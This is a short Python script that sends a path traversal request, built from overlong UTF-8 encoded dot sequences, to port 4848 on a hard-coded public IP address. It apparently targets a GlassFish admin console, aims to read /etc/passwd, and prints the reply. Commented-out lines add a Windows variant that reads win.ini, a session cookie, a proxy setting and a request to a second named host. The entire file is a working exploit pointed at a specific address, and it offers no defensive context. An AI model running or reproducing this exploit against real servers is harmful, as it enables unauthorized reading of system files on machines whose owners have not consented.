import requests

url = 'http://96.126.120.39:4848/'

# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
#     'Cookie': 'JSESSIONID=dc50600f90a3483eac921df75350'
# }

# proxy = {
#     'http': 'http://{}'.format('127.0.0.1:10808')
# }

payload_linux = 'theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
# payload_win = 'theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
target_linux = url + payload_linux
# target_win = url + payload_win

res_linux = requests.get(url=target_linux)
# res_win = requests.get(url=target_win, proxy=proxy)

print(res_linux.content.decode('utf-8'))

# res = requests.get('http://demo.vikingsword.top:1234/xui/inbounds')
# print(res.content)
